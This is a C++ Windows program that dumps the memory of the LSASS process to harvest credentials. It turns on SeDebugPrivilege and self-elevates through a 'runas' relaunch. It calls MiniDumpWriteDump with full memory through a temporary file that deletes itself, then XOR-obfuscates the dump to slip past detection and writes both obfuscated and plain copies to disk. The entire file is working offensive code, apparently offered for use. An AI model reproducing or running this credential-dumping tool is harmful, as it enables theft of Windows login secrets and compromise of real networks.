#include <windows.h>
#include <iostream>
#include <tlhelp32.h>
#include <dbghelp.h>
#include <vector>

#pragma comment(lib, "Dbghelp.lib")

typedef BOOL(WINAPI* MiniDumpWriteDump_t)(
    HANDLE hProcess,
    DWORD ProcessId,
    HANDLE hFile,
    MINIDUMP_TYPE DumpType,
    PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
    PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
    PMINIDUMP_CALLBACK_INFORMATION CallbackParam
);

BOOL CALLBACK MiniDumpCallback(
    PVOID CallbackParam,
    PMINIDUMP_CALLBACK_INPUT CallbackInput,
    PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
) {
    if (!CallbackOutput || !CallbackInput)
        return TRUE;

    switch (CallbackInput->CallbackType) {
    case ModuleCallback:
        if (CallbackOutput->ModuleWriteFlags & ModuleReferencedByMemory)
            CallbackOutput->ModuleWriteFlags &= ~ModuleReferencedByMemory;
        CallbackOutput->ModuleWriteFlags |= ModuleWriteModule | 
                                           ModuleWriteMiscRecord | 
                                           ModuleWriteCvRecord;
        return TRUE;

    case IncludeModuleCallback:
        return TRUE;

    case IncludeThreadCallback:
        return TRUE;

    case ThreadCallback:
        CallbackOutput->ThreadWriteFlags = ThreadWriteThread | 
                                          ThreadWriteContext | 
                                          ThreadWriteInstructionWindow;
        return TRUE;

    default:
        CallbackOutput->Status = S_OK;
        return TRUE;
    }
}

DWORD FindLsassPid() {
    DWORD lsassPid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W processEntry = { 0 };
        processEntry.dwSize = sizeof(PROCESSENTRY32W);
        
        if (Process32FirstW(hSnapshot, &processEntry)) {
            do {
                if (_wcsicmp(processEntry.szExeFile, L"lsass.exe") == 0) {
                    lsassPid = processEntry.th32ProcessID;
                    break;
                }
            } while (Process32NextW(hSnapshot, &processEntry));
        }
        CloseHandle(hSnapshot);
    }
    
    return lsassPid;
}

bool EnableSeDebugPrivilege() {
    HANDLE hToken = NULL;
    bool result = false;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        LUID luid;
        if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
            TOKEN_PRIVILEGES tp;
            tp.PrivilegeCount = 1;
            tp.Privileges[0].Luid = luid;
            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
                result = (GetLastError() == ERROR_SUCCESS);
            }
        }
        CloseHandle(hToken);
    }
    return result;
}

bool DumpLsassToMemoryBuffer(std::vector<BYTE>& outputBuffer) {
    outputBuffer.clear();

    DWORD lsassPid = FindLsassPid();
    if (lsassPid == 0) return false;

    HANDLE hLsass = NULL;
    DWORD accessCombinations[] = {
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE,
        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        PROCESS_ALL_ACCESS
    };

    for (DWORD access : accessCombinations) {
        hLsass = OpenProcess(access, FALSE, lsassPid);
        if (hLsass) break;
    }

    if (!hLsass) return false;

    std::cout << "[+] Got handle on lsass.exe" << std::endl;

    WCHAR tempPath[MAX_PATH] = {};
    WCHAR tempFileName[MAX_PATH] = {};

    if (!GetTempPathW(MAX_PATH, tempPath)) {
        CloseHandle(hLsass);
        return false;
    }

    if (!GetTempFileNameW(tempPath, L"LSA", 0, tempFileName)) {
        CloseHandle(hLsass);
        return false;
    }

    HANDLE hFile = CreateFileW(
        tempFileName,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_TEMPORARY | FILE_FLAG_DELETE_ON_CLOSE,
        NULL
    );

    
    if (hFile == INVALID_HANDLE_VALUE) {
        CloseHandle(hLsass);
        return false;
    }

    std::cout << "[+] Created temporary file for dumping" << std::endl;

    HMODULE hDbgHelp = LoadLibraryW(L"dbghelp.dll");
    if (!hDbgHelp) {
        CloseHandle(hFile);
        CloseHandle(hLsass);
        return false;
    }

    auto pMiniDumpWriteDump = (MiniDumpWriteDump_t)GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
    if (!pMiniDumpWriteDump) {
        FreeLibrary(hDbgHelp);
        CloseHandle(hFile);
        CloseHandle(hLsass);
        return false;
    }

    MINIDUMP_CALLBACK_INFORMATION callbackInfo = {};
    callbackInfo.CallbackRoutine = MiniDumpCallback;

    MINIDUMP_TYPE dumpType = (MINIDUMP_TYPE)(
        MiniDumpWithFullMemory |
        MiniDumpWithHandleData |
        MiniDumpWithUnloadedModules |
        MiniDumpWithThreadInfo |
        MiniDumpWithFullMemoryInfo |
        MiniDumpWithProcessThreadData |
        MiniDumpWithIndirectlyReferencedMemory
    );

    BOOL result = pMiniDumpWriteDump(
        hLsass,
        lsassPid,
        hFile,
        dumpType,
        NULL,
        NULL,
        &callbackInfo
    );

    if (!result) {
        FreeLibrary(hDbgHelp);
        CloseHandle(hFile);
        CloseHandle(hLsass);
        return false;
    }

    std::cout << "[+] Successfully dumped lsass with MiniDumpWriteDump" << std::endl;

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE || fileSize == 0) {
        FreeLibrary(hDbgHelp);
        CloseHandle(hFile);
        CloseHandle(hLsass);
        return false;
    }

    outputBuffer.resize(fileSize);

    // Reset file pointer before reading
    if (SetFilePointer(hFile, 0, NULL, FILE_BEGIN) == INVALID_SET_FILE_POINTER) {
        FreeLibrary(hDbgHelp);
        CloseHandle(hFile);
        CloseHandle(hLsass);
        return false;
    }

    DWORD bytesRead = 0;
    if (!ReadFile(hFile, outputBuffer.data(), fileSize, &bytesRead, NULL) || bytesRead != fileSize) {
        FreeLibrary(hDbgHelp);
        CloseHandle(hFile);
        CloseHandle(hLsass);
        return false;
    }

    // Cleanup
    FreeLibrary(hDbgHelp);
    CloseHandle(hFile);
    CloseHandle(hLsass);

    return true;
}

int main() {
    // Ensure we have admin rights
    BOOL isAdmin = FALSE;
    HANDLE token = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION elevation;
        DWORD size = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(token, TokenElevation, &elevation, sizeof(elevation), &size)) {
            isAdmin = elevation.TokenIsElevated;
        }
        CloseHandle(token);
    }

    // Auto-elevate if not admin
    if (!isAdmin) {
        char path[MAX_PATH] = {0};
        GetModuleFileNameA(NULL, path, MAX_PATH);
        SHELLEXECUTEINFOA sei = { sizeof(sei) };
        sei.lpVerb = "runas";
        sei.lpFile = path;
        sei.nShow = SW_NORMAL;
        ShellExecuteExA(&sei);
        return 0;
    }

    // Enable debug privilege and dump LSASS
    EnableSeDebugPrivilege();
    std::vector<BYTE> outputBuffer;
        
    if (!DumpLsassToMemoryBuffer(outputBuffer) || outputBuffer.empty() || outputBuffer.size() < 100 * 1024) {
        return 1;
    }


    const BYTE XOR_KEY = 0xAA;
    for (size_t i = 0; i < outputBuffer.size(); ++i) {
        outputBuffer[i] ^= XOR_KEY;
    }

    std::cout << "[+] Encrypting dump and writing to lsass_encrypted.dmp" << std::endl;

    // Write encrypted dump
    HANDLE encryptedFile = CreateFileA("lsass_encrypted.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (encryptedFile != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten = 0;
        WriteFile(encryptedFile, outputBuffer.data(), (DWORD)outputBuffer.size(), &bytesWritten, NULL);
        CloseHandle(encryptedFile);
    }

    // Decrypt and write decrypted dump
    for (size_t i = 0; i < outputBuffer.size(); ++i) {
        outputBuffer[i] ^= XOR_KEY;
    }

    std::cout << "[+] Decrypting the buffer to lsass_decrypted.dmp for demostration purposes" << std::endl;

    HANDLE decryptedFile = CreateFileA("lsass_decrypted.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (decryptedFile != INVALID_HANDLE_VALUE) {
        DWORD bytesWritten = 0;
        WriteFile(decryptedFile, outputBuffer.data(), (DWORD)outputBuffer.size(), &bytesWritten, NULL);
        CloseHandle(decryptedFile);
    }

    // Free memory
    outputBuffer.clear();
    std::vector<BYTE>().swap(outputBuffer);

    return 0;
}